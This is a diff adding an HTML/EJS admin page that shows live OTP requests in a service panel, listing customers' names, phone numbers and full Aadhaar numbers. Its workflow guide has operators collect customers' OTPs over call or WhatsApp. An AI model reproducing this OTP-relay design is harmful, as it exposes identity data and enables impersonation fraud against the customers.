@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0">
+
+    <title>Live OTP Requests</title>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <meta http-equiv="refresh" content="10">
+</head>
+
+<body class="bg-[#050816] text-white">
+
+    <div class="flex min-h-screen">
+
+        <!-- SIDEBAR -->
+
+        <aside class="w-72 bg-black border-r border-cyan-500 p-6 hidden md:block">
+
+            <h1 class="text-4xl font-bold text-cyan-400">
+                CyberPoint
+            </h1>
+
+            <p class="text-gray-400 mt-2">
+                Admin Panel
+            </p>
+
+            <div class="mt-12 space-y-4">
+
+                <a href="/admin/dashboard"
+                    class="block px-5 py-4 rounded-2xl border border-cyan-500 hover:bg-cyan-500 hover:text-black transition">
+                    Dashboard
+                </a>
+
+                <a href="/admin/otp-requests"
+                    class="block px-5 py-4 rounded-2xl bg-cyan-500 text-black font-bold">
+                    Live OTP Requests
+                </a>
+
+                <a href="/admin/aadhar-applications"
+                    class="block px-5 py-4 rounded-2xl border border-cyan-500 hover:bg-cyan-500 hover:text-black transition">
+                    Aadhar Applications
+                </a>
+
+                <a href="/admin/pan-applications"
+                    class="block px-5 py-4 rounded-2xl border border-cyan-500 hover:bg-cyan-500 hover:text-black transition">
+                    PAN Applications
+                </a>
+
+                <a href="/admin/upload-receiving"
+                    class="block px-5 py-4 rounded-2xl border border-cyan-500 hover:bg-cyan-500 hover:text-black transition">
+                    Upload Receiving
+                </a>
+
+                <a href="/admin/backup"
+                    class="block px-5 py-4 rounded-2xl border border-cyan-500 hover:bg-cyan-500 hover:text-black transition">
+                    Backup & Export
+                </a>
+
+                <a href="/admin/settings"
+                    class="block px-5 py-4 rounded-2xl border border-cyan-500 hover:bg-cyan-500 hover:text-black transition">
+                    Settings
+                </a>
+
+                <a href="/admin/logout"
+                    class="block px-5 py-4 rounded-2xl border border-red-500 text-red-400 hover:bg-red-500 hover:text-white transition">
+                    Logout
+                </a>
+
+            </div>
+
+        </aside>
+
+        <!-- MAIN -->
+
+        <main class="flex-1 p-6 md:p-10">
+
+            <div class="flex flex-col md:flex-row md:items-center md:justify-between gap-6">
+
+                <div>
+
+                    <h2 class="text-4xl font-bold text-cyan-400">
+                        Live OTP Requests
+                    </h2>
+
+                    <p class="text-gray-400 mt-3">
+                        Customer details submit karte hi yahan show hoga. Page har 10 second me auto refresh hota hai.
+                    </p>
+
+                </div>
+
+                <a href="/admin/dashboard"
+                    class="px-6 py-3 bg-cyan-500 rounded-xl text-black font-bold text-center">
+                    Back Dashboard
+                </a>
+
+            </div>
+
+            <!-- INFO BOX -->
+
+            <div class="bg-black border border-yellow-500 rounded-3xl p-6 mt-10">
+
+                <h3 class="text-2xl font-bold text-yellow-400">
+                    OTP Workflow Guide
+                </h3>
+
+                <div class="mt-4 space-y-2 text-gray-300">
+
+                    <p>✅ Customer Aadhaar details submit karega.</p>
+                    <p>✅ Request yahan 10 second ke andar show hogi.</p>
+                    <p>✅ Aap customer se call/WhatsApp par OTP le sakte hain.</p>
+                    <p>✅ Customer OTP dalke final payment submit karega.</p>
+
+                </div>
+
+            </div>
+
+            <!-- TABLE -->
+
+            <div class="bg-[#0b1120] border border-cyan-500 rounded-3xl mt-10 overflow-hidden">
+
+                <div class="overflow-x-auto">
+
+                    <table class="w-full text-left">
+
+                        <thead class="bg-black text-cyan-400">
+
+                            <tr>
+                                <th class="p-5">Token</th>
+                                <th class="p-5">Name</th>
+                                <th class="p-5">Mobile</th>
+                                <th class="p-5">Applicant Aadhaar</th>
+                                <th class="p-5">Father/Husband Aadhaar</th>
+                                <th class="p-5">OTP Stage</th>
+                                <th class="p-5">Status</th>
+                                <th class="p-5">Action</th>
+                            </tr>
+
+                        </thead>
+
+                        <tbody>
+
+                            <% if (applications.length === 0) { %>
+
+                                <tr class="border-t border-gray-700">
+
+                                    <td colspan="8" class="p-8 text-center text-gray-400">
+                                        Abhi koi live OTP request nahi hai.
+                                    </td>
+
+                                </tr>
+
+                            <% } %>
+
+                            <% applications.forEach((application) => { %>
+
+                                <tr class="border-t border-gray-700">
+
+                                    <td class="p-5 font-bold text-cyan-400">
+                                        <%= application.tokenNumber %>
+                                    </td>
+
+                                    <td class="p-5">
+                                        <%= application.applicantName || "-" %>
+                                    </td>
+
+                                    <td class="p-5">
+                                        <%= application.phoneNumber || "-" %>
+                                    </td>
+
+                                    <td class="p-5">
+                                        <%= application.applicantAadhar || "-" %>
+                                    </td>
+
+                                    <td class="p-5">
+                                        <%= application.relationAadhar || "-" %>
+                                    </td>
+
+                                    <td class="p-5">
+
+                                        <span class="px-4 py-2 rounded-full bg-purple-500/20 text-purple-400">
+                                            <%= application.otpStage || "OTP Pending" %>
+                                        </span>
+
+                                    </td>
+
+                                    <td class="p-5">
+
+                                        <span class="px-4 py-2 rounded-full
+                                            <%= application.status === 'Completed'
+                                                ? 'bg-green-500/20 text-green-400'
+                                                : application.status === 'Rejected'
+                                                ? 'bg-red-500/20 text-red-400'
+                                                : application.status === 'Processing'
+                                                ? 'bg-blue-500/20 text-blue-400'
+                                                : application.status === 'OTP Pending'
+                                                ? 'bg-purple-500/20 text-purple-400'
+                                                : 'bg-yellow-500/20 text-yellow-400' %>">
+
+                                            <%= application.status %>
+
+                                        </span>
+
+                                    </td>
+
+                                    <td class="p-5">
+
+                                        <a href="/admin/application/<%= application.tokenNumber %>"
+                                            class="px-4 py-2 bg-cyan-500 rounded-xl text-black font-bold">
+                                            View
+                                        </a>
+
+                                    </td>
+
+                                </tr>
+
+                            <% }) %>
+
+                        </tbody>
+
+                    </table>
+
+                </div>
+
+            </div>
+
+        </main>
+
+    </div>
+
+</body>
+</html>
